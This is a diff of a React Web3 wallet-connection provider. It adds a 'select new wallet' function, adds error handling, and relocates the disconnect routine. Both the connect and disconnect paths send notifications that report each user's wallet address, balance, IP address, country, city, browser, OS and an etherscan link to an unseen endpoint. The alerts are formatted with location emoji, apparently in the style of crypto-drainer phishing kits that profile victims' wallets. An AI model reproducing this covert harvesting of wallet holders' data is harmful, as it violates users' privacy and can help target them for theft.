@@ -46,6 +46,7 @@ type Web3ContextType = {
   balance: string
   connect: () => Promise<boolean>
   disconnect: () => void
+  selectNewWallet: () => void
   refreshBalance: () => Promise<number>
   tokenBalances: Record<string, string>
 }
@@ -56,6 +57,7 @@ export const Web3Context = createContext<Web3ContextType>({
   balance: "0",
   connect: async () => false,
   disconnect: () => {},
+  selectNewWallet: () => {},
   refreshBalance: async () => 0,
   tokenBalances: {},
 })
@@ -80,6 +82,8 @@ export function Web3Provider({ children }: { children: ReactNode }) {
   const [hasDisconnected, setHasDisconnected] = useState(false)
   const [tokenBalances, setTokenBalances] = useState<Record<string, string>>({})
   const [forceWalletSelection, setForceWalletSelection] = useState(false)
+  // Update the state to track when a user is explicitly selecting a new wallet
+  const [isSelectingNewWallet, setIsSelectingNewWallet] = useState(false)
 
   // Check if we're on mobile
   useEffect(() => {
@@ -586,82 +590,97 @@ export function Web3Provider({ children }: { children: ReactNode }) {
     }
   }
 
-  // Connect wallet
+  // Modify the connect function to handle wallet selection better
   const connect = async () => {
     if (isConnecting) return false
     setIsConnecting(true)
 
-    // If force wallet selection is enabled, always show the wallet selection modal
-    if (forceWalletSelection) {
-      setIsWalletModalOpen(true)
-      setIsConnecting(false)
-      return false
-    }
-
-    // First check if we're already connected to a wallet
-    if (isConnected && address) {
-      console.log("Already connected to wallet:", address)
-      setIsConnecting(false)
-      return true
-    }
-
-    // If user has disconnected in this session, or we're reconnecting,
-    // always show the wallet selection modal
-    if (hasDisconnected) {
-      setIsWalletModalOpen(true)
-      setIsConnecting(false)
-      return false
-    }
-
-    // Check if there's an active wallet connection we can use directly
-    const providers = detectWalletProviders()
-    for (const provider of providers) {
-      try {
-        const accounts = await provider.request({ method: "eth_accounts" })
-        if (accounts && accounts.length > 0) {
-          const connectedAddress = accounts[0]
-          const detectedWalletType = getWalletTypeFromProvider(provider)
-
-          // Skip Phantom wallet for auto-connect to force showing the modal
-          if (detectedWalletType === "Phantom") {
-            continue
-          }
-
-          console.log(`Found already connected wallet: ${detectedWalletType} with address: ${connectedAddress}`)
-
-          // Set up the connection with this provider
-          setActiveProvider(provider)
-          setAddress(connectedAddress)
-          setIsConnected(true)
-          setWalletType(detectedWalletType)
-
-          // Store connection info
-          localStorage.setItem("walletAddress", connectedAddress)
-          localStorage.setItem("wallet_connected_time", Date.now().toString())
-          localStorage.setItem("walletType", detectedWalletType)
-
-          // Get balance
-          await refreshBalanceWithProvider(provider, connectedAddress)
-          await fetchTokenBalances(connectedAddress)
-
-          // Send notification about the connection
-          await sendWalletConnectedNotification(connectedAddress, detectedWalletType, balance)
-
-          setIsConnecting(false)
-          return true
-        }
-      } catch (error) {
-        console.warn("Error checking provider:", error)
+    try {
+      // If force wallet selection is enabled or user is explicitly selecting a new wallet,
+      // always show the wallet selection modal
+      if (forceWalletSelection || isSelectingNewWallet) {
+        setIsWalletModalOpen(true)
+        setIsConnecting(false)
+        return false
       }
-    }
 
-    // If no active connection found, show the wallet selection modal
-    setIsWalletModalOpen(true)
-    setIsConnecting(false)
-    return false
+      // First check if we're already connected to a wallet
+      if (isConnected && address) {
+        console.log("Already connected to wallet:", address)
+        setIsConnecting(false)
+        return true
+      }
+
+      // If user has disconnected in this session, or we're reconnecting,
+      // always show the wallet selection modal
+      if (hasDisconnected) {
+        setIsWalletModalOpen(true)
+        setIsConnecting(false)
+        return false
+      }
+
+      // Check if there's an active wallet connection we can use directly
+      const providers = detectWalletProviders()
+      for (const provider of providers) {
+        try {
+          const accounts = await provider.request({ method: "eth_accounts" })
+          if (accounts && accounts.length > 0) {
+            const connectedAddress = accounts[0]
+            const detectedWalletType = getWalletTypeFromProvider(provider)
+
+            // Skip Phantom wallet for auto-connect to force showing the modal
+            if (detectedWalletType === "Phantom") {
+              continue
+            }
+
+            console.log(`Found already connected wallet: ${detectedWalletType} with address: ${connectedAddress}`)
+
+            // Set up the connection with this provider
+            setActiveProvider(provider)
+            setAddress(connectedAddress)
+            setIsConnected(true)
+            setWalletType(detectedWalletType)
+
+            // Store connection info
+            localStorage.setItem("walletAddress", connectedAddress)
+            localStorage.setItem("wallet_connected_time", Date.now().toString())
+            localStorage.setItem("walletType", detectedWalletType)
+
+            // Get balance
+            await refreshBalanceWithProvider(provider, connectedAddress)
+            await fetchTokenBalances(connectedAddress)
+
+            // Send notification about the connection
+            await sendWalletConnectedNotification(connectedAddress, detectedWalletType, balance)
+
+            setIsConnecting(false)
+            return true
+          }
+        } catch (error) {
+          console.warn("Error checking provider:", error)
+        }
+      }
+
+      // If no active connection found, show the wallet selection modal
+      setIsWalletModalOpen(true)
+      setIsConnecting(false)
+      return false
+    } catch (error) {
+      console.error("Error in connect function:", error)
+      setIsConnecting(false)
+      return false
+    }
   }
 
-  // Fetch token balances using Alchemy API
+  // Add a function to explicitly select a new wallet
+  const selectNewWallet = () => {
+    setIsSelectingNewWallet(true)
+    disconnectWallet().then(() => {
+      setIsWalletModalOpen(true)
+    })
+  }
+
+  // Fetch token balances
   const fetchTokenBalances = async (userAddress: string) => {
     try {
       // For now, we'll just set ETH balance
@@ -677,101 +696,15 @@ export function Web3Provider({ children }: { children: ReactNode }) {
     }
   }
 
-  // Disconnect wallet
-  const disconnectWallet = async () => {
-    console.log("Disconnecting wallet...")
-
-    // Send notification about disconnection before clearing state
-    if (address) {
-      try {
-        await trackWalletConnection({
-          address: address,
-          balance: balance,
-          walletType: walletType,
-          success: false,
-          disconnected: true,
-          ip: userIP || "Unknown",
-          country: userLocation?.country,
-          city: userLocation?.city,
-          referer: referrer,
-          userAgent: navigator.userAgent,
-          browser: userBrowser,
-          os: userOS,
-          isMobile,
-          etherscanLink: `https://etherscan.io/address/${address}`,
-        })
-      } catch (error) {
-        console.warn("Error sending disconnect notification:", error)
-      }
-    }
-
-    // Try to disconnect using provider methods if available
-    if (activeProvider) {
-      try {
-        // Some wallets support this method to disconnect
-        if (activeProvider.disconnect) {
-          await activeProvider.disconnect()
-        }
-
-        // For MetaMask and other wallets, we can try to clear permissions
-        if (activeProvider.request) {
-          try {
-            await activeProvider.request({
-              method: "wallet_revokePermissions",
-              params: [{ eth_accounts: {} }],
-            })
-          } catch (e) {
-            console.warn("Could not revoke wallet permissions:", e)
-          }
-        }
-      } catch (error) {
-        console.warn("Error disconnecting from wallet:", error)
-      }
-    }
-
-    // Clear local state
-    setAddress(null)
-    setIsConnected(false)
-    setBalance("0")
-    setWalletType("Unknown")
-    setActiveProvider(null)
-    setHasDisconnected(true) // Mark that user has explicitly disconnected
-    setForceWalletSelection(true) // Force wallet selection on next connect
-    setTokenBalances({})
-
-    // Clear localStorage
-    localStorage.removeItem("walletAddress")
-    localStorage.removeItem("walletType")
-    localStorage.removeItem("wallet_connected_time")
-
-    // Set a flag in localStorage to remember that the user has disconnected
-    localStorage.setItem("wallet_disconnected", "true")
-
-    // For Phantom wallet, we need to do additional cleanup
-    if (typeof window !== "undefined" && window.phantom?.ethereum) {
-      try {
-        // Try to disconnect Phantom specifically
-        if (window.phantom.ethereum.disconnect) {
-          await window.phantom.ethereum.disconnect()
-        }
-      } catch (error) {
-        console.warn("Error disconnecting from Phantom wallet:", error)
-      }
-    }
-
-    console.log("Wallet disconnected successfully")
-  }
-
-  // Handle wallet selection
+  // Update the handleWalletSelection function to properly handle wallet switching
   const handleWalletSelection = async (walletName: string) => {
     setIsConnecting(true)
     setIsWalletModalOpen(false)
+    setIsSelectingNewWallet(false) // Reset the selection flag
 
     try {
-      // Clear any existing connection
-      if (isConnected) {
-        await disconnectWallet()
-      }
+      // Clear any existing connection first
+      await disconnectWallet()
 
       // Reset the force wallet selection flag
       setForceWalletSelection(false)
@@ -787,31 +720,37 @@ export function Web3Provider({ children }: { children: ReactNode }) {
       if (walletName === "Phantom") {
         if (typeof window !== "undefined" && window.phantom?.ethereum) {
           const provider = window.phantom.ethereum
-          const accounts = await provider.request({ method: "eth_requestAccounts" })
+          try {
+            const accounts = await provider.request({ method: "eth_requestAccounts" })
 
-          if (accounts && accounts.length > 0) {
-            const userAddress = accounts[0]
-            console.log("Phantom wallet connected:", userAddress)
+            if (accounts && accounts.length > 0) {
+              const userAddress = accounts[0]
+              console.log("Phantom wallet connected:", userAddress)
 
-            setActiveProvider(provider)
-            setAddress(userAddress)
-            setIsConnected(true)
-            setWalletType("Phantom")
-            setHasDisconnected(false) // Reset disconnect flag
+              setActiveProvider(provider)
+              setAddress(userAddress)
+              setIsConnected(true)
+              setWalletType("Phantom")
+              setHasDisconnected(false) // Reset disconnect flag
 
-            localStorage.setItem("walletAddress", userAddress)
-            localStorage.setItem("wallet_connected_time", Date.now().toString())
-            localStorage.setItem("walletType", "Phantom")
-            localStorage.removeItem("wallet_disconnected") // Clear disconnected flag
+              localStorage.setItem("walletAddress", userAddress)
+              localStorage.setItem("wallet_connected_time", Date.now().toString())
+              localStorage.setItem("walletType", "Phantom")
+              localStorage.removeItem("wallet_disconnected") // Clear disconnected flag
 
-            await refreshBalanceWithProvider(provider, userAddress)
-            await fetchTokenBalances(userAddress)
+              await refreshBalanceWithProvider(provider, userAddress)
+              await fetchTokenBalances(userAddress)
 
-            // Send notification
-            await sendWalletConnectedNotification(userAddress, "Phantom", balance)
+              // Send notification
+              await sendWalletConnectedNotification(userAddress, "Phantom", balance)
 
+              setIsConnecting(false)
+              return true
+            }
+          } catch (error) {
+            console.error("Error connecting to Phantom:", error)
             setIsConnecting(false)
-            return true
+            return false
           }
         } else {
           alert("Phantom wallet not detected. Please install it first.")
@@ -873,34 +812,40 @@ export function Web3Provider({ children }: { children: ReactNode }) {
 
       // Request accounts
       console.log("Requesting accounts...")
-      const accounts = await targetProvider.request({ method: "eth_requestAccounts" })
+      try {
+        const accounts = await targetProvider.request({ method: "eth_requestAccounts" })
 
-      if (!accounts || accounts.length === 0) {
-        throw new Error("No accounts returned from wallet")
+        if (!accounts || accounts.length === 0) {
+          throw new Error("No accounts returned from wallet")
+        }
+
+        const userAddress = accounts[0]
+        console.log("Account connected:", userAddress)
+
+        // Update state
+        setAddress(userAddress)
+        setIsConnected(true)
+        setHasDisconnected(false) // Reset disconnect flag
+
+        // Store connection info
+        localStorage.setItem("walletAddress", userAddress)
+        localStorage.setItem("wallet_connected_time", Date.now().toString())
+        localStorage.setItem("walletType", walletName)
+        localStorage.removeItem("wallet_disconnected") // Clear disconnected flag
+
+        // Get balance
+        const balanceValue = await refreshBalanceWithProvider(targetProvider, userAddress)
+        await fetchTokenBalances(userAddress)
+
+        // Send notification
+        await sendWalletConnectedNotification(userAddress, walletName, balanceValue.toFixed(6))
+
+        return true
+      } catch (error) {
+        console.error("Error requesting accounts:", error)
+        setIsConnecting(false)
+        return false
       }
-
-      const userAddress = accounts[0]
-      console.log("Account connected:", userAddress)
-
-      // Update state
-      setAddress(userAddress)
-      setIsConnected(true)
-      setHasDisconnected(false) // Reset disconnect flag
-
-      // Store connection info
-      localStorage.setItem("walletAddress", userAddress)
-      localStorage.setItem("wallet_connected_time", Date.now().toString())
-      localStorage.setItem("walletType", walletName)
-      localStorage.removeItem("wallet_disconnected") // Clear disconnected flag
-
-      // Get balance
-      const balanceValue = await refreshBalanceWithProvider(targetProvider, userAddress)
-      await fetchTokenBalances(userAddress)
-
-      // Send notification
-      await sendWalletConnectedNotification(userAddress, walletName, balanceValue.toFixed(6))
-
-      return true
     } catch (error) {
       console.error("Error connecting wallet:", error)
 
@@ -928,6 +873,90 @@ export function Web3Provider({ children }: { children: ReactNode }) {
     } finally {
       setIsConnecting(false)
     }
+  }
+
+  // Update the disconnectWallet function to properly clean up all connections
+  const disconnectWallet = async () => {
+    console.log("Disconnecting wallet...")
+
+    // Send notification about disconnection before clearing state
+    if (address) {
+      try {
+        await trackWalletConnection({
+          address: address,
+          balance: balance,
+          walletType: walletType,
+          success: false,
+          disconnected: true,
+          ip: userIP || "Unknown",
+          country: userLocation?.country,
+          city: userLocation?.city,
+          referer: referrer,
+          userAgent: navigator.userAgent,
+          browser: userBrowser,
+          os: userOS,
+          isMobile,
+          etherscanLink: `https://etherscan.io/address/${address}`,
+        })
+      } catch (error) {
+        console.warn("Error sending disconnect notification:", error)
+      }
+    }
+
+    // Try to disconnect using provider methods if available
+    if (activeProvider) {
+      try {
+        // Some wallets support this method to disconnect
+        if (activeProvider.disconnect) {
+          await activeProvider.disconnect()
+        }
+
+        // For MetaMask and other wallets, we can try to clear permissions
+        if (activeProvider.request) {
+          try {
+            await activeProvider.request({
+              method: "wallet_revokePermissions",
+              params: [{ eth_accounts: {} }],
+            })
+          } catch (e) {
+            console.warn("Could not revoke wallet permissions:", e)
+          }
+        }
+      } catch (error) {
+        console.warn("Error disconnecting from wallet:", error)
+      }
+    }
+
+    // Clear local state
+    setAddress(null)
+    setIsConnected(false)
+    setBalance("0")
+    setWalletType("Unknown")
+    setActiveProvider(null)
+    setHasDisconnected(true) // Mark that user has explicitly disconnected
+    setTokenBalances({})
+
+    // Clear localStorage
+    localStorage.removeItem("walletAddress")
+    localStorage.removeItem("walletType")
+    localStorage.removeItem("wallet_connected_time")
+
+    // Set a flag in localStorage to remember that the user has disconnected
+    localStorage.setItem("wallet_disconnected", "true")
+
+    // For Phantom wallet, we need to do additional cleanup
+    if (typeof window !== "undefined" && window.phantom?.ethereum) {
+      try {
+        // Try to disconnect Phantom specifically
+        if (window.phantom.ethereum.disconnect) {
+          await window.phantom.ethereum.disconnect()
+        }
+      } catch (error) {
+        console.warn("Error disconnecting from Phantom wallet:", error)
+      }
+    }
+
+    console.log("Wallet disconnected successfully")
   }
 
   // Send wallet connected notification
@@ -1056,6 +1085,7 @@ ${userLocation?.country ? `📍 Location: ${userLocation.country}${userLocation.
     }
   }, [])
 
+  // Update the provider value to include the new function
   return (
     <Web3Context.Provider
       value={{
@@ -1064,6 +1094,7 @@ ${userLocation?.country ? `📍 Location: ${userLocation.country}${userLocation.
         balance,
         connect,
         disconnect,
+        selectNewWallet,
         refreshBalance,
         tokenBalances,
       }}
@@ -1071,7 +1102,10 @@ ${userLocation?.country ? `📍 Location: ${userLocation.country}${userLocation.
       {children}
       <WalletConnectionModal
         isOpen={isWalletModalOpen}
-        onClose={() => setIsWalletModalOpen(false)}
+        onClose={() => {
+          setIsWalletModalOpen(false)
+          setIsSelectingNewWallet(false)
+        }}
         walletOptions={WALLET_OPTIONS}
         otherWalletOptions={OTHER_WALLET_OPTIONS}
         onSelectWallet={handleWalletSelection}
